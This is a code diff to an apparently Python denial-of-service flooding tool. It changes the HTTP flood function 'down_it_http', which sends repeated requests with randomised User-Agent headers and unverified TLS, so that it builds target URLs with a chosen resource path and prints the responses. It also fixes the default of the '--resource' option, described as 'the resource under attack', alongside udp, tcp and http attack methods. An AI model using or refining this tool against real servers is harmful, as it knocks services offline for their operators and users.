@@ -90,16 +90,23 @@ def down_it_http():
         if port == 443:
             protocol = 'https://'
 
-        url = f"{protocol}{host}:{port}"
+        if port in [443, 80]:
+            url = f"{protocol}{host}{resource}"
+        else:
+            url = f"{protocol}{host}:{port}{resource}"
+
+        print(url)
+
         http_headers = headers_dict
         http_headers['User-Agent'] = random.choice(uagent).strip()
 
         try:
             context = ssl._create_unverified_context()
-            urllib.request.urlopen(
+            r = urllib.request.urlopen(
                 urllib.request.Request(url, headers=http_headers),
                 context=context
             )
+            print(r.headers)
         except Exception as e:
             if error_debug:
                 print("\033[91mError: " + str(e) + ".\033[0m")
@@ -172,7 +179,7 @@ def get_parameters():
                     help="Debug error messages")
     optp.add_option("-m", "--method", type="str", dest="attack_method",
                     help="Attack method: udp (default), tcp, http")
-    optp.add_option('--resource', type='str', dest='resource', help='It shows the resource under attack.', default=True)
+    optp.add_option('--resource', type='str', dest='resource', help='It shows the resource under attack.', default="/")
     opts, args = optp.parse_args()
     if opts.help:
         usage()
